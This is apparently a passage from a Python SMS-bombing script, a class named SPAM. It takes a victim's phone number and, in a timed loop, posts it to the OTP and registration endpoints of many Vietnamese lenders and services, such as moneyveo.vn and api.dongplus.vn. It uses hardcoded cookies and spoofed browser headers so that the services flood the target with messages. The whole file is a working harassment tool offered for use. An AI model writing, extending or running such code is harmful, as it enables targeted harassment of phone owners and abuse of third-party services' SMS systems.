            'UserMachineId_png': '47b03718-646e-42a5-8b42-2a24d33c98ce',
            'UserMachineId_etag': '47b03718-646e-42a5-8b42-2a24d33c98ce',
            'UserMachineId_cache': '47b03718-646e-42a5-8b42-2a24d33c98ce',
            'UserMachineId': '47b03718-646e-42a5-8b42-2a24d33c98ce',
            '_ga_LCPCW0ZYR8': 'GS1.1.1691242208.2.1.1691242262.6.0.0',
        }

        headers = {
            'authority': 'moneyveo.vn',
            'accept': '*/*',
            'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'CaptchaCookieKey=0; language=vi; __sbref=xuhfrhdfpccttpywqlsjmvekfhoptfnxcliuhvbq; _ga=GA1.1.727012381.1690951688; UserTypeMarketing=L0; ASP.NET_SessionId=ljwjktynbp4tl2zlgv1m2j0j; RequestData=64d9de55-166b-4064-8dc7-13f13c0d7c9e; LeadPartner31B92E50BCF7EFC6A1=lgid=13&lpid=utm_medium%3daffiliate%26tracking_id%3dwNrjPv5LHzjUc5qBWn4hv8yXXYnKF6GCQ2dCEUzyYHUqCV7r%26utm_source%3daccesstrade%26utm_term%3d1581307%26atnct1%3d0e095e054ee94774d6a496099eb1cf6a%26atnct2%3dwNrjPv5LHzjUc5qBWn4hv8yXXYnKF6GCQ2dCEUzyYHUqCV7r%26atnct3%3dyidLs00085c00xw57; ET31B92E50BCF7EFC6A1=-8585077728267921875; UserMachineId_png=47b03718-646e-42a5-8b42-2a24d33c98ce; UserMachineId_etag=47b03718-646e-42a5-8b42-2a24d33c98ce; UserMachineId_cache=47b03718-646e-42a5-8b42-2a24d33c98ce; UserMachineId=47b03718-646e-42a5-8b42-2a24d33c98ce; _ga_LCPCW0ZYR8=GS1.1.1691242208.2.1.1691242262.6.0.0',
            'origin': 'https://moneyveo.vn',
            'referer': 'https://moneyveo.vn/vi/registernew/',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'traceparent': '00-adfab1b73e90499787cd095625acb2dd-f173cd850fcea9d2-00',
            'user-agent': uua,
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'phoneNumber': self.sdt,
        }

        async with aiohttp.ClientSession(cookies=cookies, headers=headers) as session:
            async with session.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', cookies=cookies, headers=headers, data=data) as response:
                if response.status == 200:
                    print("$", "moneyveo: Thanh cong")
                else:
                    print("$", "moneyveo: That bai")

    async def dongplus(self):
        cookies = {
            '_ga': 'GA1.1.742860520.1691243240',
            '_ga_RRJDDZGPYG': 'GS1.1.1691243240.1.1.1691243272.28.0.0',
        }

        headers = {
            'authority': 'api.dongplus.vn',
            'accept': '*/*',
            'accept-language': 'vi',
            'content-type': 'application/json',
            # 'cookie': '_ga=GA1.1.742860520.1691243240; _ga_RRJDDZGPYG=GS1.1.1691243240.1.1.1691243272.28.0.0',
            'origin': 'https://dongplus.vn',
            'referer': 'https://dongplus.vn/user/login',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': uua,
        }

        json_data = {
            'phone': self.sdt,
        }

        async with aiohttp.ClientSession(cookies=cookies, headers=headers) as session:
            async with session.post('https://api.dongplus.vn/api/user/send-one-time-password',cookies=cookies, headers=headers, json=json_data ) as response:
                if response.status == 200:
                    print("$", "dongplus: Thanh cong")
                else:
                    print("$", "dongplus: That bai")


    def stop_spam(self):
        print("hết giờ")
        os._exit(0)

    async def run(self):
        self.sdt = sys.argv[1]
        if self.sdt != '0327216333':
            if len(self.sdt) == 10:
                run_time = int(sys.argv[2])
                start_time = time.time()
                stop_timer = threading.Timer(run_time, self.stop_spam)
                stop_timer.start()  # Start the timer
                while time.time() - start_time < run_time:
                    await self.tantaioi()
                    await self.call1()
                    await self.nhac()
                    await self.vayvnd()
                    await self.nh247()
                    await self.oldtamo()
                    await self.dongplus()
                    await self.credit()
                    await self.vayvnd()
                    await self.f88()
                    await self.monneyveo()
                    await self.viettel2()
                    await self.swift247()
                    await self.vietlott()
                    await self.vamo()
                    await self.fpt()
                    await self.call()
                    await self.robocash()
                    await self.kiotviet()
                    await self.pizza()
                    await self.tienoi()
                    await self.myviettel()

            else:
                print("SỐ ĐIỆN THOẠI DƯỚI <10 SỐ XIN NHẬP LẠI !")
        else:
            print("LÀM ƠN ĐỪNG SPAM SỐ ĐIỆN THOẠI HOANG")


if __name__ == "__main__":
    try:
        asyncio.run(SPAM().run())
    except KeyboardInterrupt:
        time.sleep(3)
